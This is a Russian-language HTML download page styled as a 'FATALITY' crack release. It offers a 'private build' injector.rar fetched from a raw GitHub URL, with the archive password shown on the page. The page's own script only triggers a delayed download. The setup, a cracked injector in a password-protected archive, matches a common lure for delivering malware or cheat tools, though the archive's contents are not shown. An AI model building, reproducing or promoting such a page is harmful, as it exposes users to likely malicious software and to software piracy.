<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FATALITY — SOFT CRACK</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #0a0a12;
      color: #fff;
      font-family: 'Segoe UI', 'Poppins', 'Roboto', system-ui, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
      position: relative;
      overflow-x: hidden;
      background: radial-gradient(circle at 30% 20%, rgba(128, 0, 255, 0.25) 0%, transparent 45%),
                  radial-gradient(circle at 80% 80%, rgba(200, 0, 255, 0.15) 0%, transparent 40%),
                  radial-gradient(circle at 50% 50%, rgba(20, 0, 30, 0.95) 80%, #0a0a12 100%);
    }

    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: repeating-linear-gradient(45deg, rgba(160, 0, 255, 0.03) 0px, rgba(160, 0, 255, 0.03) 2px, transparent 2px, transparent 8px);
      pointer-events: none;
      z-index: 0;
    }

    .container {
      width: 100%;
      max-width: 620px;
      position: relative;
      z-index: 2;
    }

    .main-title {
      text-align: center;
      font-size: 54px;
      font-weight: 900;
      letter-spacing: 6px;
      line-height: 1.1;
      text-transform: uppercase;
      color: #f0e6ff;
      text-shadow: 0 0 18px #b16eff, 0 0 40px #7a00ff, 0 0 70px #4b0082;
      margin-bottom: 8px;
      word-break: break-word;
      font-family: 'Impact', 'Arial Black', 'Segoe UI Black', sans-serif;
    }

    .subtitle-crack {
      text-align: center;
      font-size: 22px;
      letter-spacing: 5px;
      font-weight: 700;
      text-transform: uppercase;
      color: #c084fc;
      text-shadow: 0 0 12px #b300ff;
      margin-bottom: 28px;
      background: rgba(20, 0, 25, 0.5);
      display: inline-block;
      padding: 6px 18px;
      border-radius: 40px;
      backdrop-filter: blur(2px);
      border: 1px solid rgba(190, 100, 255, 0.6);
      width: fit-content;
      margin-left: auto;
      margin-right: auto;
    }

    .title-wrapper {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 30px;
    }

    .crack-card {
      background: rgba(12, 0, 22, 0.8);
      backdrop-filter: blur(10px);
      border-radius: 24px;
      padding: 36px 28px;
      box-shadow: 0 0 40px rgba(160, 0, 255, 0.5), 0 20px 50px rgba(0, 0, 0, 0.7);
      border: 1px solid #9b30ff;
      text-align: center;
      transition: all 0.2s;
    }

    .hack-icon {
      font-size: 62px;
      margin-bottom: 12px;
      filter: drop-shadow(0 0 15px #c56cff);
      letter-spacing: 6px;
    }

    .soft-text {
      font-size: 26px;
      font-weight: 800;
      letter-spacing: 4px;
      text-transform: uppercase;
      color: #f5e6ff;
      text-shadow: 0 0 10px #e066ff;
      margin-bottom: 6px;
    }

    .file-desc {
      font-size: 15px;
      color: #c7a3e6;
      letter-spacing: 2px;
      font-weight: 500;
      margin-bottom: 30px;
      background: rgba(65, 0, 105, 0.4);
      display: inline-block;
      padding: 8px 20px;
      border-radius: 30px;
      border-left: 3px solid #b44dff;
      border-right: 3px solid #b44dff;
    }

    .download-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      width: 100%;
      background: #1e0033;
      border: 2px solid #c06eff;
      color: #fff;
      padding: 22px 20px;
      border-radius: 60px;
      font-size: 30px;
      font-weight: 900;
      letter-spacing: 5px;
      text-transform: uppercase;
      cursor: pointer;
      text-decoration: none;
      transition: 0.2s ease;
      box-shadow: 0 0 30px #a600ff, 0 10px 30px rgba(0, 0, 0, 0.6);
      margin-bottom: 20px;
      font-family: 'Arial Black', 'Impact', sans-serif;
      color: #f0e0ff;
      text-shadow: 0 0 12px white;
    }

    .download-btn:hover {
      background: #32004d;
      border-color: #e0a0ff;
      box-shadow: 0 0 45px #cc66ff, 0 15px 35px black;
      transform: scale(1.02);
      letter-spacing: 8px;
    }

    .download-btn:active {
      transform: scale(0.98);
      background: #160024;
    }

    .loading-text {
      display: none;
      color: #ffcc4d;
      font-size: 16px;
      letter-spacing: 3px;
      font-weight: 700;
      margin-top: 10px;
      text-transform: uppercase;
      text-shadow: 0 0 8px #ffae00;
    }

    .loading-text.active {
      display: block;
      animation: blinkWarning 0.9s infinite;
    }

    @keyframes blinkWarning {
      0% {
        opacity: 1;
      }
      50% {
        opacity: 0.3;
      }
      100% {
        opacity: 1;
      }
    }

    .password-block {
      margin-top: 25px;
      background: rgba(30, 20, 0, 0.7);
      border: 1px dashed #ffcc00;
      padding: 12px 10px;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      flex-wrap: wrap;
      backdrop-filter: blur(4px);
    }

    .password-label {
      color: #f0e68c;
      font-size: 14px;
      letter-spacing: 2px;
      text-transform: uppercase;
      font-weight: 600;
    }

    .password-value {
      color: #ffd966;
      font-size: 22px;
      font-weight: 900;
      letter-spacing: 6px;
      text-transform: uppercase;
      background: #00000040;
      padding: 4px 18px;
      border-radius: 30px;
      border: 1px solid #ffb700;
      text-shadow: 0 0 10px #ff9900;
      font-family: 'Courier New', monospace;
    }

    .footer {
      text-align: center;
      margin-top: 28px;
      color: #aa80ff;
      font-size: 13px;
      letter-spacing: 2px;
      text-transform: uppercase;
      opacity: 0.8;
    }

    @media (max-width: 500px) {
      .main-title {
        font-size: 36px;
        letter-spacing: 3px;
      }
      .download-btn {
        font-size: 22px;
        padding: 18px 10px;
        letter-spacing: 3px;
      }
      .soft-text {
        font-size: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Верхняя часть с капсом FATALITY -->
    <div class="title-wrapper">
      <div class="main-title">FATALITY</div>
      <div class="subtitle-crack">SOFT CRACK</div>
    </div>

    <!-- Основная карточка с кряком -->
    <div class="crack-card">
      <div class="hack-icon">💀⚡💀</div>
      <div class="soft-text">PRIVATE BUILD</div>
      <div class="file-desc">injector.rar</div>

      <!-- КНОПКА СКАЧАТЬ БОЛЬШАЯ -->
      <button class="download-btn" id="downloadBtn">
        ⬇️ СКАЧАТЬ
      </button>
      <div class="loading-text" id="loadingText">⚡ ПОДГОТОВКА КРЯКА... ⚡</div>

      <!-- ЖЁЛТЫЙ БЛОК С ПАРОЛЕМ -->
      <div class="password-block">
        <span class="password-label">🔑 ПАРОЛЬ ОТ АРХИВА:</span>
        <span class="password-value">fatality</span>
      </div>
    </div>

    <div class="footer">
      FATALITY TEAM © 2026 // RELEASE 3.4.889
    </div>
  </div>

  <script>
    (function() {
      const downloadBtn = document.getElementById('downloadBtn');
      const loadingText = document.getElementById('loadingText');

      // Файл injector.rar — ссылка на raw github
      const fileUrl = 'https://raw.githubusercontent.com/WENerty1337/-FATALITY-/main/injector.rar';
      const fileName = 'injector.rar';

      function startDownload() {
        // Показываем индикатор
        loadingText.classList.add('active');
        downloadBtn.disabled = true;
        downloadBtn.style.opacity = '0.7';
        downloadBtn.style.cursor = 'wait';

        // Небольшая задержка перед скачиванием (для эффекта)
        setTimeout(() => {
          // Создаем невидимую ссылку
          const link = document.createElement('a');
          link.href = fileUrl;
          link.download = fileName;
          link.style.display = 'none';
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);

          // Восстанавливаем кнопку
          loadingText.classList.remove('active');
          downloadBtn.disabled = false;
          downloadBtn.style.opacity = '1';
          downloadBtn.style.cursor = 'pointer';
        }, 1800);
      }

      downloadBtn.addEventListener('click', startDownload);
    })();
  </script>
</body>
</html>
